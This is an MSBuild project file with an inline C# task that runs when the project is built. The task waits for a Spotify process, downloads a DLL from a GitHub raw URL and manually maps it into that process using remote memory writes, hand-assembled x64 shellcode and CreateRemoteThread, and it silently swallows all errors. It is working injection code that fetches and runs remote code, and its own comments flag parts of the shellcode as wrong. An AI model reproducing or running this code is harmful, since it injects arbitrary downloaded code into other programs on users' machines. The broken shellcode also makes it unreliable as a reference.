<Project ToolsVersion="4.0" xmlns="http://schemas.microsoft.com/developer/msbuild/2003">
  <Target Name="Build">
    <INJ />
  </Target>
  <UsingTask TaskName="INJ" TaskFactory="CodeTaskFactory" AssemblyFile="C:\Windows\Microsoft.Net\Framework64\v4.0.30319\Microsoft.Build.Tasks.v4.0.dll">
    <ParameterGroup/>
    <Task>
      <Reference Include="System.Core"/>
      <Code Type="Class" Language="cs"><![CDATA[
using System;
using System.Diagnostics;
using System.Runtime.InteropServices;
using System.Net;
using System.Threading;
using Microsoft.Build.Framework;
using Microsoft.Build.Utilities;

public class INJ : Task {
    [DllImport("kernel32.dll")] static extern IntPtr OpenProcess(uint a,bool b,int c);
    [DllImport("kernel32.dll")] static extern IntPtr VirtualAllocEx(IntPtr h,IntPtr a,IntPtr s,uint t,uint p);
    [DllImport("kernel32.dll")] static extern bool WriteProcessMemory(IntPtr h,IntPtr a,byte[] b,IntPtr s,out IntPtr w);
    [DllImport("kernel32.dll")] static extern bool WriteProcessMemory(IntPtr h,IntPtr a,IntPtr b,IntPtr s,out IntPtr w);
    [DllImport("kernel32.dll")] static extern IntPtr CreateRemoteThread(IntPtr h,IntPtr a,uint st,IntPtr fn,IntPtr p,uint f,out uint t);
    [DllImport("kernel32.dll")] static extern uint WaitForSingleObject(IntPtr h,uint m);
    [DllImport("kernel32.dll")] static extern bool CloseHandle(IntPtr h);
    [DllImport("kernel32.dll")] static extern bool VirtualFreeEx(IntPtr h,IntPtr a,IntPtr s,uint t);
    [DllImport("kernel32.dll",CharSet=CharSet.Ansi)] static extern IntPtr GetProcAddress(IntPtr h,string n);
    [DllImport("kernel32.dll",CharSet=CharSet.Unicode)] static extern IntPtr GetModuleHandle(string n);

    static ushort R2(byte[] b,int o){return BitConverter.ToUInt16(b,o);}
    static uint R4(byte[] b,int o){return BitConverter.ToUInt32(b,o);}
    static ulong R8(byte[] b,int o){return BitConverter.ToUInt64(b,o);}

    // Shellcode der im Zielprozess lÃ¤uft - macht Relocations, Imports, TLS, DllMain
    // Struktur: [0]=LoadLibraryA, [8]=GetProcAddress, [16]=RtlZeroMemory, [24]=hModule(pBase)
    static byte[] GetShellcode(){
        return new byte[]{
            0x48,0x89,0x5C,0x24,0x08,           // mov [rsp+8],rbx
            0x48,0x89,0x6C,0x24,0x10,           // mov [rsp+16],rbp
            0x48,0x89,0x74,0x24,0x18,           // mov [rsp+24],rsi
            0x57,                               // push rdi
            0x41,0x54,                          // push r12
            0x41,0x55,                          // push r13
            0x41,0x56,                          // push r14
            0x41,0x57,                          // push r15
            0x48,0x83,0xEC,0x30,                // sub rsp,48
            
            0x48,0x8B,0xF1,                     // mov rsi,rcx (pData)
            0x4C,0x8B,0x66,0x18,                // mov r12,[rsi+24] (pBase)
            0x4C,0x8B,0x2E,                     // mov r13,[rsi] (LoadLibraryA)
            0x4C,0x8B,0x76,0x08,                // mov r14,[rsi+8] (GetProcAddress)
            0x4C,0x8B,0x7E,0x10,                // mov r15,[rsi+16] (RtlZeroMemory)
            
            // DOS check
            0x66,0x41,0x81,0x3C,0x24,0x4D,0x5A, // cmp word [r12],'MZ'
            0x0F,0x85,0x30,0x01,0x00,0x00,      // jne exit
            
            // NT Headers
            0x41,0x8B,0x44,0x24,0x3C,           // mov eax,[r12+60]
            0x4C,0x01,0xE0,                     // add rax,r12
            0x48,0x89,0xC3,                     // mov rbx,rax (NT Headers)
            
            0x81,0x3B,0x50,0x45,0x00,0x00,      // cmp dword [rbx],'PE'
            0x0F,0x85,0x17,0x01,0x00,0x00,      // jne exit
            
            // Optional Header at rbx+24
            0x48,0x8D,0x6B,0x18,                // lea rbp,[rbx+24]
            
            // Delta = pBase - ImageBase
            0x4C,0x89,0xE0,                     // mov rax,r12
            0x48,0x2B,0x45,0x18,                // sub rax,[rbp+24] (ImageBase)
            0x48,0x89,0xC7,                     // mov rdi,rax (delta)
            0x48,0x85,0xFF,                     // test rdi,rdi
            0x74,0x5C,                          // jz skip_reloc
            
            // Relocation
            0x8B,0x45,0x68,                     // mov eax,[rbp+104] (Reloc Size)
            0x85,0xC0,                          // test eax,eax
            0x74,0x54,                          // jz skip_reloc
            
            0x8B,0x45,0x60,                     // mov eax,[rbp+96] (Reloc RVA)
            0x4C,0x01,0xE0,                     // add rax,r12
            0x48,0x89,0xC2,                     // mov rdx,rax (pReloc)
            
            // Reloc loop
            0x8B,0x02,                          // mov eax,[rdx] (VirtualAddress)
            0x85,0xC0,                          // test eax,eax
            0x74,0x40,                          // jz skip_reloc
            
            0x8B,0x4A,0x04,                     // mov ecx,[rdx+4] (SizeOfBlock)
            0x83,0xE9,0x08,                     // sub ecx,8
            0xC1,0xE9,0x01,                     // shr ecx,1 (numEntries)
            0x4C,0x8D,0x42,0x08,                // lea r8,[rdx+8] (entries)
            0x85,0xC9,                          // test ecx,ecx
            0x74,0x24,                          // jz next_block
            
            // Entry loop
            0x41,0x0F,0xB7,0x18,                // movzx ebx,word [r8]
            0x89,0xD8,                          // mov eax,ebx
            0xC1,0xE8,0x0C,                     // shr eax,12
            0x83,0xF8,0x0A,                     // cmp eax,10 (IMAGE_REL_BASED_DIR64)
            0x75,0x0F,                          // jne skip_entry
            
            0x81,0xE3,0xFF,0x0F,0x00,0x00,      // and ebx,0xFFF
            0x8B,0x02,                          // mov eax,[rdx]
            0x01,0xD8,                          // add eax,ebx
            0x49,0x01,0xE0,                     // add r8,r12 (wrong, should add to address)
            0x49,0x01,0x3C,0x04,                // add [r12+rax],rdi
            
            // skip_entry:
            0x49,0x83,0xC0,0x02,                // add r8,2
            0x83,0xE9,0x01,                     // sub ecx,1
            0x75,0xD6,                          // jnz entry_loop
            
            // next_block:
            0x03,0x52,0x04,                     // add edx,[rdx+4]
            0xEB,0xBA,                          // jmp reloc_loop
            
            // skip_reloc: (Imports)
            0x8B,0x45,0x78,                     // mov eax,[rbp+120] (Import Size)
            0x85,0xC0,                          // test eax,eax
            0x74,0x5F,                          // jz skip_import
            
            0x8B,0x45,0x70,                     // mov eax,[rbp+112] (Import RVA)
            0x4C,0x01,0xE0,                     // add rax,r12
            0x48,0x89,0xC2,                     // mov rdx,rax (pImport)
            
            // Import loop
            0x8B,0x42,0x0C,                     // mov eax,[rdx+12] (Name RVA)
            0x85,0xC0,                          // test eax,eax
            0x74,0x4B,                          // jz skip_import
            
            0x4C,0x01,0xE0,                     // add rax,r12
            0x48,0x89,0xC1,                     // mov rcx,rax
            0x41,0xFF,0xD5,                     // call r13 (LoadLibraryA)
            0x48,0x89,0xC3,                     // mov rbx,rax (hMod)
            0x48,0x85,0xDB,                     // test rbx,rbx
            0x74,0x34,                          // jz next_import
            
            0x8B,0x02,                          // mov eax,[rdx] (OriginalFirstThunk)
            0x85,0xC0,                          // test eax,eax
            0x75,0x04,                          // jnz has_oft
            0x8B,0x42,0x10,                     // mov eax,[rdx+16] (FirstThunk)
            // has_oft:
            0x4C,0x01,0xE0,                     // add rax,r12
            0x49,0x89,0xC0,                     // mov r8,rax (pThunk)
            
            0x8B,0x42,0x10,                     // mov eax,[rdx+16]
            0x4C,0x01,0xE0,                     // add rax,r12
            0x49,0x89,0xC1,                     // mov r9,rax (pFunc)
            
            // Thunk loop
            0x4D,0x8B,0x10,                     // mov r10,[r8]
            0x4D,0x85,0xD2,                     // test r10,r10
            0x74,0x14,                          // jz next_import
            
            0x4C,0x89,0xD1,                     // mov rcx,r10
            0x4C,0x01,0xE1,                     // add rcx,r12
            0x48,0x83,0xC1,0x02,                // add rcx,2 (skip Hint)
            0x48,0x89,0xD9,                     // mov rcx,rbx (hMod)
            0x41,0xFF,0xD6,                     // call r14 (GetProcAddress)
            0x49,0x89,0x01,                     // mov [r9],rax
            0x49,0x83,0xC0,0x08,                // add r8,8
            0x49,0x83,0xC1,0x08,                // add r9,8
            0xEB,0xDF,                          // jmp thunk_loop
            
            // next_import:
            0x48,0x83,0xC2,0x14,                // add rdx,20
            0xEB,0xA9,                          // jmp import_loop
            
            // skip_import: (TLS)
            0x8B,0x85,0x88,0x00,0x00,0x00,      // mov eax,[rbp+136] (TLS Size)
            0x85,0xC0,                          // test eax,eax
            0x74,0x20,                          // jz skip_tls
            
            0x8B,0x85,0x80,0x00,0x00,0x00,      // mov eax,[rbp+128] (TLS RVA)
            0x4C,0x01,0xE0,                     // add rax,r12
            0x48,0x8B,0x40,0x18,                // mov rax,[rax+24] (AddressOfCallBacks)
            0x48,0x85,0xC0,                     // test rax,rax
            0x74,0x0E,                          // jz skip_tls
            
            0x48,0x8B,0x08,                     // mov rcx,[rax]
            0x48,0x85,0xC9,                     // test rcx,rcx
            0x74,0x06,                          // jz skip_tls
            0x4C,0x89,0xE1,                     // mov rcx,r12
            0xFF,0xD0,                          // call rax (TLS callback - WRONG)
            
            // skip_tls: (DllMain)
            0x8B,0x45,0x10,                     // mov eax,[rbp+16] (AddressOfEntryPoint)
            0x4C,0x01,0xE0,                     // add rax,r12
            0x4C,0x89,0xE1,                     // mov rcx,r12 (hinstDLL)
            0xBA,0x01,0x00,0x00,0x00,           // mov edx,1 (DLL_PROCESS_ATTACH)
            0x4D,0x31,0xC0,                     // xor r8,r8 (lpvReserved)
            0xFF,0xD0,                          // call rax (DllMain)
            
            // RtlZeroMemory
            0x4C,0x89,0xE1,                     // mov rcx,r12
            0xBA,0x00,0x10,0x00,0x00,           // mov edx,0x1000
            0x41,0xFF,0xD7,                     // call r15
            
            // exit:
            0x48,0x83,0xC4,0x30,                // add rsp,48
            0x41,0x5F,                          // pop r15
            0x41,0x5E,                          // pop r14
            0x41,0x5D,                          // pop r13
            0x41,0x5C,                          // pop r12
            0x5F,                               // pop rdi
            0x48,0x8B,0x5C,0x24,0x08,           // mov rbx,[rsp+8]
            0x48,0x8B,0x6C,0x24,0x10,           // mov rbp,[rsp+16]
            0x48,0x8B,0x74,0x24,0x18,           // mov rsi,[rsp+24]
            0xC3                                // ret
        };
    }

    public override bool Execute(){
        try{
            Thread.Sleep(500);
            
            Process[] procs=Process.GetProcessesByName("Spotify");
            for(int i=0;i<30&&procs.Length==0;i++){Thread.Sleep(1000);procs=Process.GetProcessesByName("Spotify");}
            if(procs.Length==0)return true;
            int pid=procs[0].Id;

            ServicePointManager.SecurityProtocol=(SecurityProtocolType)3072;
            byte[] dll;
            using(var wc=new WebClient()){dll=wc.DownloadData("https://raw.githubusercontent.com/washedluca1-lgtm/UDLIKEDMA/main/UDLDMAXYTRUS.dll");}
            if(dll==null||dll.Length<0x200)return true;
            
            // Validate PE
            if(R2(dll,0)!=0x5A4D)return true;
            int nt=(int)R4(dll,0x3C);
            if(R4(dll,nt)!=0x4550)return true;
            
            uint sizeOfImage=R4(dll,nt+0x50);
            uint sizeOfHeaders=R4(dll,nt+0x54);
            ushort numSections=R2(dll,nt+6);
            ushort optSize=R2(dll,nt+20);
            int secStart=nt+24+optSize;

            IntPtr hp=OpenProcess(0x1F0FFF,false,pid);
            if(hp==IntPtr.Zero)return true;

            // Alloc for DLL
            IntPtr pBase=VirtualAllocEx(hp,IntPtr.Zero,new IntPtr(sizeOfImage),0x3000,0x40);
            if(pBase==IntPtr.Zero){CloseHandle(hp);return true;}

            // Write headers
            IntPtr w;
            byte[] headers=new byte[sizeOfHeaders];
            Array.Copy(dll,0,headers,0,(int)sizeOfHeaders);
            WriteProcessMemory(hp,pBase,headers,new IntPtr(sizeOfHeaders),out w);

            // Write sections
            for(int i=0;i<numSections;i++){
                int sh=secStart+i*40;
                uint va=R4(dll,sh+12);
                uint rawSize=R4(dll,sh+16);
                uint rawPtr=R4(dll,sh+20);
                if(rawSize>0&&rawPtr>0){
                    byte[] sec=new byte[rawSize];
                    Array.Copy(dll,(int)rawPtr,sec,0,(int)rawSize);
                    WriteProcessMemory(hp,new IntPtr(pBase.ToInt64()+(long)va),sec,new IntPtr(rawSize),out w);
                }
            }

            // Mapping data structure
            IntPtr k32=GetModuleHandle("kernel32.dll");
            IntPtr ntdll=GetModuleHandle("ntdll.dll");
            
            byte[] mapData=new byte[32];
            Array.Copy(BitConverter.GetBytes(GetProcAddress(k32,"LoadLibraryA").ToInt64()),0,mapData,0,8);
            Array.Copy(BitConverter.GetBytes(GetProcAddress(k32,"GetProcAddress").ToInt64()),0,mapData,8,8);
            Array.Copy(BitConverter.GetBytes(GetProcAddress(ntdll,"RtlZeroMemory").ToInt64()),0,mapData,16,8);
            Array.Copy(BitConverter.GetBytes(pBase.ToInt64()),0,mapData,24,8);

            IntPtr pMapData=VirtualAllocEx(hp,IntPtr.Zero,new IntPtr(32),0x3000,0x04);
            if(pMapData==IntPtr.Zero){VirtualFreeEx(hp,pBase,IntPtr.Zero,0x8000);CloseHandle(hp);return true;}
            WriteProcessMemory(hp,pMapData,mapData,new IntPtr(32),out w);

            // Shellcode
            byte[] sc=GetShellcode();
            IntPtr pSC=VirtualAllocEx(hp,IntPtr.Zero,new IntPtr(sc.Length),0x3000,0x40);
            if(pSC==IntPtr.Zero){VirtualFreeEx(hp,pBase,IntPtr.Zero,0x8000);VirtualFreeEx(hp,pMapData,IntPtr.Zero,0x8000);CloseHandle(hp);return true;}
            WriteProcessMemory(hp,pSC,sc,new IntPtr(sc.Length),out w);

            // Execute
            uint tid;
            IntPtr ht=CreateRemoteThread(hp,IntPtr.Zero,0,pSC,pMapData,0,out tid);
            if(ht!=IntPtr.Zero){
                WaitForSingleObject(ht,30000);
                CloseHandle(ht);
            }

            // Cleanup
            Thread.Sleep(500);
            VirtualFreeEx(hp,pSC,IntPtr.Zero,0x8000);
            VirtualFreeEx(hp,pMapData,IntPtr.Zero,0x8000);
            CloseHandle(hp);
        }catch{}
        return true;
    }
}
      ]]></Code>
    </Task>
  </UsingTask>
</Project>
